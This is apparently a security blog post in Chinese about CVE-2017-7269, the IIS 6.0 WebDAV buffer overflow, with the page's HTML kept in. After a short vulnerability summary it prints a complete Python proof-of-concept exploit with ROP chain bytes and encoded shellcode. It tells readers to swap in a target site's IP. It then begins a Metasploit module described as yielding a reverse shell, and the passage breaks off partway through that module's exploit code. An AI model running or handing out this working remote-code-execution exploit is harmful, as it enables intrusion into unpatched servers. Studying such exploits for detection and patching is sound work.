<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>IIS6.0远程命令执行漏洞(CVE-2017-7269) - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="漏洞信息 漏洞编号：CVE-2017-7269 发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院） 漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。 漏洞类型：缓冲区溢出 漏洞等级：高危 影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证） 触发函数：ScStoragePathFromUrl函数 附加信息：ScStoragePathFromUrl函数被调用了两次 漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &amp;lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。
利用条件  iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2  POC #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab &amp;amp; School of Computer Science &amp;amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="IIS6.0远程命令执行漏洞(CVE-2017-7269)" />
<meta property="og:description" content="漏洞信息 漏洞编号：CVE-2017-7269 发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院） 漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。 漏洞类型：缓冲区溢出 漏洞等级：高危 影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证） 触发函数：ScStoragePathFromUrl函数 附加信息：ScStoragePathFromUrl函数被调用了两次 漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。
利用条件  iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2  POC #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/iis6.0-remote-command-execution-vulnerability-cve-2017-7269/" />
<meta property="article:published_time" content="2018-01-16T19:10:45+00:00" />
<meta property="article:modified_time" content="2018-01-16T19:10:45+00:00" />
<meta itemprop="name" content="IIS6.0远程命令执行漏洞(CVE-2017-7269)">
<meta itemprop="description" content="漏洞信息 漏洞编号：CVE-2017-7269 发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院） 漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。 漏洞类型：缓冲区溢出 漏洞等级：高危 影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证） 触发函数：ScStoragePathFromUrl函数 附加信息：ScStoragePathFromUrl函数被调用了两次 漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。
利用条件  iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2  POC #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail.">
<meta itemprop="datePublished" content="2018-01-16T19:10:45+00:00" />
<meta itemprop="dateModified" content="2018-01-16T19:10:45+00:00" />
<meta itemprop="wordCount" content="371">



<meta itemprop="keywords" content="漏洞,IIS6.0,远程命令执行," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="IIS6.0远程命令执行漏洞(CVE-2017-7269)"/>
<meta name="twitter:description" content="漏洞信息 漏洞编号：CVE-2017-7269 发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院） 漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。 漏洞类型：缓冲区溢出 漏洞等级：高危 影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证） 触发函数：ScStoragePathFromUrl函数 附加信息：ScStoragePathFromUrl函数被调用了两次 漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。
利用条件  iis6.0 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200） windows server 2003 R2  POC #------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous. #written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China #-----------Email: edwardz@foxmail."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">IIS6.0远程命令执行漏洞(CVE-2017-7269)</h1>
        <p class="post-meta">Jan 16, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="漏洞信息">漏洞信息</h1>
<p>漏洞编号：CVE-2017-7269
发现人员：Zhiniang Peng和Chen  Wu（华南理工大学信息安全实验室,计算机科学与工程学院）
漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。
漏洞类型：缓冲区溢出
漏洞等级：高危
影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证,其他版本尚未验证）
触发函数：ScStoragePathFromUrl函数
附加信息：ScStoragePathFromUrl函数被调用了两次
漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: &lt;Http://”开始的较长header头的PROPFIND请求执行任意代码。</p>
<h1 id="利用条件">利用条件</h1>
<!-- raw HTML omitted -->
<ul>
<li>iis6.0</li>
<li>开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200）</li>
<li>windows server 2003 R2</li>
</ul>
<h1 id="poc">POC</h1>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span>
<span class="c1">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China</span>
<span class="c1">#-----------Email: edwardz@foxmail.com</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>
<span class="n">pay</span><span class="o">=</span><span class="s1">&#39;PROPFIND / HTTP/1.1</span><span class="se">\r\n</span><span class="s1">Host: localhost</span><span class="se">\r\n</span><span class="s1">Content-Length: 0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;If: &lt;http://localhost/aaaaaaa&#39;</span> <span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac</span><span class="s1">&#39;</span> <span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;&#39;</span>
<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39; (Not ) &lt;http://localhost/bbbbbbb&#39;</span> <span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81</span><span class="s1">&#39;</span> <span class="n">shellcode</span><span class="o">=</span><span class="s1">&#39;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA&#39;</span> <span class="n">pay</span><span class="o">+=</span><span class="n">shellcode</span> <span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
<span class="k">print</span> <span class="n">pay</span>
<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">80960</span><span class="p">)</span>
<span class="k">print</span> <span class="n">data</span>
<span class="n">sock</span><span class="o">.</span><span class="n">close</span>
</code></pre></div><p><strong>修改代码sock.connect((‘127.0.0.1’,80))，将其中ip地址改为目标网站ip，运行该py文件，会在目标服务器上产生一个calc进程（计算器）。</strong></p>
<h1 id="exp">Exp</h1>
<blockquote>
<p>以上poc只是用来验证此漏洞是否存在，但需要登录的服务器上查看进程才能确定。经过国外大牛的加工，编写了一个利用msf反弹shell的ruby脚本。</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">require</span> <span class="s1">&#39;msf/core&#39;</span>
<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="n">Msf</span><span class="p">::</span><span class="n">Exploit</span><span class="p">::</span><span class="n">Remote</span> <span class="n">Rank</span> <span class="o">=</span> <span class="n">GoodRanking</span> <span class="n">include</span> <span class="n">Msf</span><span class="p">::</span><span class="n">Exploit</span><span class="p">::</span><span class="n">Remote</span><span class="p">::</span><span class="n">Tcp</span> <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span> <span class="nb">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s1">&#39;Name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;CVE-2017-7269 Microsoft IIS WebDav ScStoragePathFromUrl Overflow&#39;</span><span class="p">,</span>
<span class="s1">&#39;Description&#39;</span> <span class="o">=&gt;</span> <span class="o">%</span><span class="n">q</span><span class="p">{</span>
<span class="n">Buffer</span> <span class="n">overflow</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">ScStoragePathFromUrl</span> <span class="n">function</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">WebDAV</span> <span class="n">service</span> <span class="ow">in</span> <span class="n">Internet</span> <span class="n">Information</span> <span class="n">Services</span> <span class="p">(</span><span class="n">IIS</span><span class="p">)</span> <span class="mf">6.0</span> <span class="ow">in</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2003</span> <span class="n">R2</span> <span class="n">allows</span> <span class="n">remote</span> <span class="n">attackers</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">arbitrary</span> <span class="n">code</span> <span class="n">via</span> <span class="n">a</span> <span class="nb">long</span> <span class="n">header</span> <span class="n">beginning</span> <span class="k">with</span> <span class="s2">&#34;If: &lt;http://&#34;</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">PROPFIND</span> <span class="n">request</span><span class="p">,</span> <span class="k">as</span> <span class="n">exploited</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">wild</span> <span class="ow">in</span> <span class="n">July</span> <span class="ow">or</span> <span class="n">August</span> <span class="mf">2016.</span> <span class="n">Original</span> <span class="n">exploit</span> <span class="n">by</span> <span class="n">Zhiniang</span> <span class="n">Peng</span> <span class="ow">and</span> <span class="n">Chen</span> <span class="n">Wu</span><span class="o">.</span> <span class="p">},</span> <span class="s1">&#39;Author&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">&#39;Dominic Chell &lt;dominic@mdsec.co.uk&gt;&#39;</span> <span class="p">],</span>
<span class="s1">&#39;License&#39;</span> <span class="o">=&gt;</span> <span class="n">MSF_LICENSE</span><span class="p">,</span>
<span class="s1">&#39;References&#39;</span> <span class="o">=&gt;</span>
<span class="p">[</span>
<span class="p">[</span> <span class="s1">&#39;CVE&#39;</span><span class="p">,</span> <span class="s1">&#39;CVE-2017-7269&#39;</span><span class="p">],</span>
<span class="p">[</span> <span class="s1">&#39;BID&#39;</span><span class="p">,</span> <span class="s1">&#39;97127&#39;</span><span class="p">],</span>
<span class="p">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;https://github.com/edwardz246003/IIS_exploit&#39;</span><span class="p">],</span>
<span class="p">],</span>
<span class="s1">&#39;Privileged&#39;</span> <span class="o">=&gt;</span> <span class="n">false</span><span class="p">,</span>
<span class="s1">&#39;Payload&#39;</span> <span class="o">=&gt;</span>
<span class="p">{</span>
<span class="s1">&#39;Space&#39;</span> <span class="o">=&gt;</span> <span class="mi">2000</span><span class="p">,</span>
<span class="s1">&#39;BadChars&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span>
<span class="s1">&#39;EncoderType&#39;</span> <span class="o">=&gt;</span> <span class="n">Msf</span><span class="p">::</span><span class="n">Encoder</span><span class="p">::</span><span class="n">Type</span><span class="p">::</span><span class="n">AlphanumUnicodeMixed</span><span class="p">,</span>
<span class="s1">&#39;DisableNops&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;True&#39;</span><span class="p">,</span>
<span class="s1">&#39;EncoderOptions&#39;</span> <span class="o">=&gt;</span>
<span class="p">{</span>
<span class="s1">&#39;BufferRegister&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ESI&#39;</span><span class="p">,</span>
<span class="p">}</span>
<span class="p">},</span>
<span class="s1">&#39;DefaultOptions&#39;</span> <span class="o">=&gt;</span>
<span class="p">{</span>
<span class="s1">&#39;EXITFUNC&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;process&#39;</span><span class="p">,</span>
<span class="s1">&#39;PrependMigrate&#39;</span> <span class="o">=&gt;</span> <span class="n">true</span><span class="p">,</span>
<span class="s1">&#39;PrependMigrateProc&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;calc&#34;</span>
<span class="p">},</span>
<span class="s1">&#39;Targets&#39;</span> <span class="o">=&gt;</span>
<span class="p">[</span>
<span class="p">[</span>
<span class="s1">&#39;Microsoft Windows Server 2003 R2&#39;</span><span class="p">,</span>
<span class="p">{</span>
<span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span><span class="p">,</span>
<span class="p">},</span>
<span class="p">],</span>
<span class="p">],</span>
<span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span><span class="p">,</span>
<span class="s1">&#39;DisclosureDate&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;March 26 2017&#39;</span><span class="p">,</span>
<span class="s1">&#39;DefaultTarget&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">register_options</span><span class="p">(</span>
<span class="p">[</span>
<span class="n">Opt</span><span class="p">::</span><span class="n">RPORT</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span>
<span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
<span class="n">end</span>
<span class="k">def</span> <span class="nf">exploit</span>
<span class="n">connect</span>
<span class="n">buf1</span> <span class="o">=</span> <span class="s2">&#34;If: &lt;http://localhost/aaaaaaa&#34;</span>
<span class="n">buf1</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;</span><span class="se">\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac</span><span class="s2">&#34;</span>
<span class="n">buf1</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34;&gt;&#34;</span>
<span class="n">buf1</span> <span class="o">&lt;&lt;</span> <span class="s2">&#34; (Not ) &lt;http://localhost/bbbbbbb&#34;</span>
